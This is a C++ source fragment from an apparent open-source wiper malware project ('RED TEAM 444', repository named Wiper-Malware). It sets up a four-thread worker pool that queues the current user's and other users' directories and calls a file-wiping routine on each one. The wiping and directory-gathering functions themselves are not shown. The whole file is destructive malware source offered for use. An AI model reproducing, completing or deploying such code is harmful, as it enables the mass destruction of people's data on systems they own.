/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <thread>
#include <queue>
#include <mutex>
#include <condition_variable>

std::queue<std::string> directoriesToScan;
std::mutex queueMutex;
std::condition_variable condition;
bool done = false;

// Worker thread function for processing directories
void directoryWorker() {
    while (true) {
        std::string directory;
        {
            std::unique_lock<std::mutex> lock(queueMutex);
            condition.wait(lock, [] { return !directoriesToScan.empty() || done; });

            if (directoriesToScan.empty()) return;
            directory = directoriesToScan.front();
            directoriesToScan.pop();
        }
        findAndWipeFiles(directory);  // Wipe files in the directory
    }
}

// Main wiper function using a thread pool for efficiency
void runWiper() {
    std::vector<std::string> directories = getSystemDirectories();  // Automatically get user directories
    addOtherUsersDirectories(directories);  // Optionally scan other users' directories

    const int numThreads = 4;  // Number of threads to use
    std::vector<std::thread> workers;

    for (int i = 0; i < numThreads; ++i) {
        workers.emplace_back(directoryWorker);  // Create worker threads
    }

    // Add directories to the queue
    {
        std::unique_lock<std::mutex> lock(queueMutex);
        for (const auto& directory : directories) {
            directoriesToScan.push(directory);
        }
    }
    condition.notify_all();

    // Wait for all threads to finish
    {
        std::unique_lock<std::mutex> lock(queueMutex);
        done = true;
    }
    condition.notify_all();

    for (auto& worker : workers) {
        worker.join();
    }
}
